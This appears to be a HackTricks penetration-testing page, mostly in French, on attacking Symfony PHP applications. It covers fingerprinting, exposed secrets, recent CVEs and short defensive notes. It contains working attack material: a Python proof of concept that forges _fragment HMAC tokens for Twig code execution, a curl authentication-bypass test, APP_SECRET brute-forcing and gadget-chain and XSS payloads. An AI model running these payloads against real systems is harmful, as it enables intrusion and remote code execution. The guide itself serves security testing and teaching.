# Symfony

{{#include ../../banners/hacktricks-training.md}}

Symfony est l'un des frameworks PHP les plus utilisés et apparaît régulièrement dans les assessments de cibles enterprise, e-commerce et CMS (Drupal, Shopware, Ibexa, OroCRM … intègrent tous des composants Symfony). Cette page rassemble des conseils offensifs, des mauvaises configurations courantes et des vulnérabilités récentes que vous devriez avoir sur votre liste de contrôle lorsque vous découvrez une application Symfony.

> Note historique : Une grande partie de l'écosystème utilise encore la branche **5.4 LTS** (EOL **November 2025**). Symfony **7.4** est devenu le nouveau LTS en **Nov 2025** et recevra des correctifs de sécurité jusqu'en **Nov 2029**. Vérifiez toujours le niveau de patch exact car de nombreux advisories 2024‑2026 ont été corrigés uniquement dans des micro-releases.

---

## Recon & Enumeration

### Finger-printing
* En-têtes de réponse HTTP : `X-Powered-By: Symfony`, `X-Debug-Token`, `X-Debug-Token-Link` ou cookies commençant par `sf_redirect`, `sf_session`, `MOCKSESSID`.
* Source code leaks (`composer.json`, `composer.lock`, `/vendor/…`) révèlent souvent la version exacte :
```bash
curl -s https://target/vendor/composer/installed.json | jq '.[] | select(.name|test("symfony/")) | .name,.version'
```
* Routes publiques qui n'existent que sur Symfony :
* `/_profiler`   (Symfony **Profiler** & debug toolbar)
* `/_wdt/<token>` (“Web Debug Toolbar”)
* `/_error/{code}.{_format}` (pretty error pages)
* `/app_dev.php`, `/config.php`, `/config_dev.php` (pre-4.0 dev front-controllers)
* Wappalyzer, BuiltWith ou listes de mots pour ffuf/feroxbuster : `symfony.txt` → cherchez `/_fragment`, `/_profiler`, `.env`, `.htaccess`.

### Interesting files & endpoints
| Path | Why it matters |
|------|----------------|
| `/.env`, `/.env.local`, `/.env.prod` | Souvent mal déployé → leaks `APP_SECRET`, DB creds, SMTP, AWS keys |
| `/.git`, `.svn`, `.hg` | Divulgation du code source → credentials + business logic |
| `/var/log/*.log`, `/log/dev.log` | Mauvaise configuration du web-root expose des stack-traces |
| `/_profiler` | Historique complet des requêtes, configuration, service container, **APP_SECRET** (≤ 3.4) |
| `/_fragment` | Point d'entrée utilisé par ESI/HInclude. Abus possible une fois que vous connaissez `APP_SECRET` |
| `/vendor/phpunit/phpunit/phpunit` | PHPUnit RCE si accessible (CVE-2017-9841) |
| `/index.php/_error/{code}` | Finger-print & parfois leak des traces d'exception |

---

## High-impact Vulnerabilities

### 1. APP_SECRET disclosure ➜ RCE via `/_fragment` (aka “secret-fragment”)
* **CVE-2019-18889** à l'origine, mais apparaît *toujours* sur des cibles modernes lorsque le debug est laissé activé ou que `.env` est exposé.
* Une fois que vous connaissez la `APP_SECRET` de 32 caractères, créez un token HMAC et abusez du contrôleur interne `render()` pour exécuter du code Twig arbitraire :
```python
# PoC – requires the secret
import hmac, hashlib, requests, urllib.parse as u
secret = bytes.fromhex('deadbeef…')
payload = "{{['id']|filter('system')}}"   # RCE in Twig
query = {
'template': '@app/404.html.twig',
'filter': 'raw',
'_format': 'html',
'_locale': 'en',
'globals[cmd]': 'id'
}
qs = u.urlencode(query, doseq=True)
token = hmac.new(secret, qs.encode(), hashlib.sha256).hexdigest()
r = requests.get(f"https://target/_fragment?{qs}&_token={token}")
print(r.text)
```
* Excellent write-up & exploitation script: Ambionics blog (linked in References).

### 2. PATH_INFO auth bypass – **CVE-2025-64500** (HttpFoundation)
* Affecte les versions antérieures à 5.4.50, 6.4.29 et 7.3.7. La normalisation des chemins pouvait supprimer le `/` initial, brisant les règles d'accès qui supposent `/admin` etc.
* Test rapide : `curl -H 'PATH_INFO: admin/secret' https://target/index.php` → si cela atteint les routes admin sans authentification, la vulnérabilité est présente.
* Corriger en mettant à jour `symfony/http-foundation` ou l'ensemble du framework au niveau de patch fixe.

### 3. MSYS2/Git-Bash argument mangling – **CVE-2026-24739** (Process)
* Affecte les versions antérieures à 5.4.51, 6.4.33, 7.3.11, 7.4.5 et 8.0.5 sur Windows lorsque PHP est exécuté depuis MSYS2 (Git-Bash, mingw). `Process` ne quote pas correctement `=` entraînant des chemins corrompus ; des commandes destructrices (`rmdir`, `del`) peuvent cibler des répertoires non prévus.
* Si vous pouvez uploader un script PHP ou influencer des helpers Composer/CLI qui appellent `Process`, craft arguments contenant `=` (ex. `E:/=tmp/delete`) pour provoquer une réécriture de chemin.

### 4. Runtime env/argv injection – **CVE-2024-50340** (Runtime)
* Lorsque `register_argv_argc=On` et en utilisant des runtimes non-SAPI, des query strings craftées pouvaient inverser `APP_ENV`/`APP_DEBUG` via le parsing de `argv`. Patché en 5.4.46/6.4.14/7.1.7.
* Cherchez `/?--env=prod` ou similaire accepté dans les logs.

### 5. URL validation / open redirect – **CVE-2024-50345** (HttpFoundation)
* Des caractères spéciaux dans l'URI n'étaient pas validés comme le font les navigateurs, permettant des redirections vers des domaines contrôlés par l'attaquant. Corrigé en 5.4.46/6.4.14/7.1.7.

### 6. Symfony UX attribute injection – **CVE-2025-47946**
* `symfony/ux-twig-component` & `symfony/ux-live-component` avant **2.25.1** rendent `{{ attributes }}` sans escaping → injection d'attributs / XSS. Si l'app permet aux utilisateurs de définir des attributs de composant (admin CMS, email templating), vous pouvez enchaîner sur une injection de script.
* Mettez à jour les deux packages vers 2.25.1+. Comme exploit manuel, placez du JS dans une valeur d'attribut passée à un composant custom et déclenchez son rendu.

### 7. Windows Process Hijack – **CVE-2024-51736** (Process)
* Le composant `Process` recherchait le répertoire de travail courant **avant** `PATH` sur Windows. Un attaquant capable d'uploader `tar.exe`, `cmd.exe`, etc. dans un web-root inscriptible et de déclencher `Process` (ex. extraction de fichiers, génération de PDF) obtient l'exécution de commandes.
* Patché en 5.4.50, 6.4.14, 7.1.7.

### 8. Session-Fixation – **CVE-2023-46733**
* L'authentication guard réutilisait un ID de session existant après le login. Si un attaquant définit le cookie **avant** que la victime s'authentifie, il prend le contrôle du compte après le login.

### 9. Twig sandbox XSS – **CVE-2023-46734**
* Dans des applications qui exposent des templates contrôlés par l'utilisateur (admin CMS, email builder) le filtre `nl2br` pouvait être abusé pour bypasser le sandbox et injecter du JS.

### 10. Symfony 1 gadget chains (still found in legacy apps)
* `phpggc symfony/1 system id` produit un payload Phar qui déclenche une RCE lorsqu'un unserialize() se produit sur des classes telles que `sfNamespacedParameterHolder`. Vérifiez les endpoints d'upload de fichiers et les wrappers `phar://`.

{{#ref}}
../../pentesting-web/deserialization/php-deserialization-+-autoload-classes.md
{{#endref}}

---

## Exploitation Cheat-Sheet

### Calculer le token HMAC pour `/_fragment`
```bash
python - <<'PY'
import sys, hmac, hashlib, urllib.parse as u
secret = bytes.fromhex(sys.argv[1])
qs     = u.quote_plus(sys.argv[2], safe='=&')
print(hmac.new(secret, qs.encode(), hashlib.sha256).hexdigest())
PY deadbeef… "template=@App/evil&filter=raw&_format=html"
```
### Bruteforce d'un `APP_SECRET` faible
```bash
cewl -d3 https://target -w words.txt
symfony-secret-bruteforce.py -w words.txt -c abcdef1234567890 https://target
```
### RCE via exposed Symfony Console
Si `bin/console` est accessible via `php-fpm` ou par upload CLI direct :
```bash
php bin/console about        # confirm it works
php bin/console cache:clear --no-warmup
```
Utilisez deserialization gadgets dans le cache directory ou écrivez un Twig template malveillant qui sera exécuté lors de la requête suivante.

### Tester rapidement le PATH_INFO bypass (CVE-2025-64500)
```bash
curl -i -H 'PATH_INFO: admin/secret' https://target/index.php
# If it returns protected content without redirect/auth, the Request normalization is vulnerable.
```
### Spray UX injection d'attributs (CVE-2025-47946)
```twig
{# attacker-controlled attribute value #}
<live:button {{ attributes|merge({'onclick':'alert(1)'}) }} />
```
Si la sortie rendue renvoie l'attribut sans échappement, XSS fonctionne. Mettez à jour vers 2.25.1+.

---

## Defensive notes
1. **Ne jamais déployer debug** (`APP_ENV=dev`, `APP_DEBUG=1`) en production ; bloquez `/app_dev.php`, `/_profiler`, `/_wdt` dans la configuration du serveur web.
2. Stockez les secrets dans des env vars ou `vault/secrets.local.php`, *jamais* dans des fichiers accessibles depuis le document-root.
3. Assurez la gestion des correctifs – abonnez-vous aux avis de sécurité Symfony et maintenez au moins le niveau de patch LTS (5.4.x until Nov 2025, 6.4 until Nov 2027, 7.4 until Nov 2029).
4. Si vous êtes sous Windows, mettez à jour immédiatement pour atténuer CVE-2024-51736 & CVE-2026-24739 ou ajoutez une défense en profondeur `open_basedir`/`disable_functions`.

---

### Useful offensive tooling
* **ambionics/symfony-exploits** – secret-fragment RCE, découverte des routes du debugger.
* **phpggc** – chaînes de gadgets prêtes à l'emploi pour Symfony 1 & 2.
* **sf-encoder** – petit utilitaire pour calculer le HMAC `_fragment` (implémentation Go).

## References
* [Ambionics – Symfony “secret-fragment” Remote Code Execution](https://www.ambionics.io/blog/symfony-secret-fragment)
* [Symfony Security Advisory – CVE-2024-51736: Command Execution Hijack on Windows Process Component](https://symfony.com/blog/cve-2024-51736-command-execution-hijack-on-windows-with-process-class)
* [Symfony Blog – CVE-2025-47946: Unsanitized HTML attribute injection in UX components](https://symfony.com/blog/symfony-ux-cve-2025-47946-unsanitized-html-attribute-injection-via-componentattributes)
* [Symfony Blog – CVE-2026-24739: Incorrect argument escaping under MSYS2/Git Bash](https://symfony.com/blog/cve-2026-24739-incorrect-argument-escaping-under-msys2-git-bash-on-windows-can-lead-to-destructive-file-operations)
{{#include ../../banners/hacktricks-training.md}}
